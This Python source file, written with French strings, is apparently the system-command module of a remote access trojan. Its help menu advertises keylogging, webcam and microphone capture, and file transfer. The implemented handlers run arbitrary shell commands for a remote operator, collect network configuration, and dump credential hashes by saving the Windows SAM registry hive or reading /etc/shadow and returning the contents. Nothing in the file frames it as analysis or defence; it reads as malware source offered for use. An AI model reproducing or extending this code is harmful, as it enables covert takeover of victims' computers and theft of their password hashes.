import platform
import subprocess
import os

from src.utils.logger import setup_logger
from src.utils.protocol import make_msg, OP_RESP, OP_ERROR

log = setup_logger("cmd.system")

_OS = platform.system()

HELP_TEXT = """
Commandes disponibles :
  help                  - aide
  shell <cmd>           - execute une commande
  ipconfig              - infos reseau
  screenshot            - capture ecran
  download <path>       - telecharge un fichier
  upload <path>         - envoie un fichier
  search <nom>          - recherche un fichier
  hashdump              - dump hashes systeme
  keylogger start/stop  - keylogger
  webcam_snapshot       - photo webcam
  webcam_stream         - stream webcam
  record_audio <sec>    - enregistre le micro
"""


def cmd_help():
    return make_msg(OP_RESP, payload=HELP_TEXT)


def cmd_shell(conn, cmd_str):
    parts = cmd_str.split(" ", 1)
    if len(parts) < 2:
        return make_msg(OP_RESP, payload="Usage: shell <commande>")

    shell_cmd = parts[1]
    try:
        if _OS == "Windows":
            result = subprocess.run(
                shell_cmd, shell=True, capture_output=True, text=True, timeout=30
            )
        else:
            result = subprocess.run(
                shell_cmd,
                shell=True,
                capture_output=True,
                text=True,
                executable="/bin/bash",
                timeout=30,
            )
        output = result.stdout + result.stderr
        return make_msg(OP_RESP, payload=output or "(aucune sortie)")
    except subprocess.TimeoutExpired:
        return make_msg(OP_ERROR, payload="Timeout (30s)")
    except Exception as e:
        log.error(f"Erreur shell: {e}")
        return make_msg(OP_ERROR, payload=str(e))


def cmd_ipconfig():
    try:
        if _OS == "Windows":
            out = subprocess.check_output("ipconfig /all", shell=True, text=True)
        else:
            try:
                out = subprocess.check_output(
                    "ifconfig", shell=True, text=True, stderr=subprocess.DEVNULL
                )
            except Exception:
                out = subprocess.check_output("ip a", shell=True, text=True)
        return make_msg(OP_RESP, payload=out)
    except Exception as e:
        log.error(f"Erreur ipconfig: {e}")
        return make_msg(OP_ERROR, payload=str(e))


def cmd_hashdump():
    try:
        if _OS == "Windows":
            tmp = os.path.join(os.environ.get("TEMP", "C:\\Temp"), "sam_dump.hiv")
            subprocess.run(f"reg save HKLM\\SAM {tmp} /y", shell=True, check=True)
            with open(tmp, "rb") as f:
                data = f.read()
            os.remove(tmp)
            import base64

            b64 = base64.b64encode(data).decode()
            return make_msg(
                OP_RESP, payload=f"SAM (base64): {b64[:200]}... (tronque)"
            )
        else:
            with open("/etc/shadow", "r") as f:
                content = f.read()
            return make_msg(OP_RESP, payload=content)
    except PermissionError:
        return make_msg(OP_ERROR, payload="Permissions insuffisantes (root/admin requis)")
    except Exception as e:
        log.error(f"Erreur hashdump: {e}")
        return make_msg(OP_ERROR, payload=str(e))
